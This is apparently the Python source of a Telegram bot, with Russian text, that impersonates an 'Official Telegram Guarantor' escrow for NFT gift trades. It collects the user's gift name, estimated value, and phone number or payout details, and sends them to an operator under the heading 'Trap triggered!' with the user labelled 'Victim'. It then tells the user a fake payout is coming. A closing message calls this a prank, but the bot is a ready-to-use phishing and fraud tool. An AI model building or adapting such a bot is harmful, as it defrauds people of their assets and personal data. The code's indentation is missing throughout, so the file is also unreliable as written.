
import os
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

API_TOKEN = os.getenv('BOT_TOKEN')
bot = telebot.TeleBot(API_TOKEN)
user_states = {}

@bot.message_handler(commands=['start'])
def cmd_start(message):
kb = InlineKeyboardMarkup()
kb.add(InlineKeyboardButton('🎁 Создать сделку с NFT', callback_data='create_deal'))
bot.send_message(message.chat.id, '🤖 **Добро пожаловать в Официальный Гарант Telegram!**\n\nЗдесь можно безопасно передавать NFT-подарки без комиссий.', reply_markup=kb, parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: call.data == 'create_deal')
def start_deal(call):
bot.answer_callback_query(call.id)
bot.send_message(call.message.chat.id, '🎁 Введите название NFT-подарка, который хотите передать:')
user_states[call.from_user.id] = {'step': 'waiting_for_item'}

@bot.message_handler(func=lambda m: m.from_user.id in user_states and user_states[m.from_user.id]['step'] in ['waiting_for_item', 'waiting_for_price', 'waiting_for_phone'])
def handle_steps(message):
uid = message.from_user.id
s = user_states[uid]
if s['step'] == 'waiting_for_item':
s['item'] = message.text
s['step'] = 'waiting_for_price'
bot.send_message(message.chat.id, '💵 Укажите оценочную стоимость подарка (например, в USDT или баксах):')
elif s['step'] == 'waiting_for_price':
s['price'] = message.text
s['step'] = 'waiting_for_phone'
bot.send_message(message.chat.id, '✅ Отлично! Теперь укажите ваш номер телефона или реквизиты для получения выплаты:')
elif s['step'] == 'waiting_for_phone':
item = s.get('item')
price = s.get('price')
phone = message.text
name = message.from_user.full_name
username = f"@{message.from_user.username}" if message.from_user.username else "нет"
bot.send_message(message.chat.id, '⏳ **Сделка зарегистрирована!**\nОжидаем подтверждения от Гаранта и перевода средств...', parse_mode='Markdown')
ADMIN_ID = 123456789 # ЗАМЕНИ НА СВОЙ ID ЦИФРАМИ
kb_admin = InlineKeyboardMarkup()
kb_admin.add(InlineKeyboardButton('✅ Подтвердить перевод денег', callback_data=f'approve_{uid}'))
bot.send_message(ADMIN_ID, f'🚨 **Сработала ловушка!**\n\n👤 Жертва: {name} ({username})\n🎁 Подарок: {item}\n💰 Стоимость: {price}\n📞 Реквизиты: {phone}', parse_mode='Markdown', reply_markup=kb_admin)
del user_states[uid]

@bot.callback_query_handler(func=lambda call: call.data.startswith('approve_'))
def approve_deal(call):
target_id = int(call.data.split('_')[1])
bot.answer_callback_query(call.id)
bot.send_message(target_id, '✅ **Сделка совершена успешно!**\n\nСредства будут отправлены вам в течение часа с момента конца сделки.', parse_mode='Markdown')
bot.edit_message_text('✅ Вы успешно подтвердили сделку и разыграли друга!', call.message.chat.id, call.message.message_id)

if __name__ == '__main__':
bot.infinity_polling()

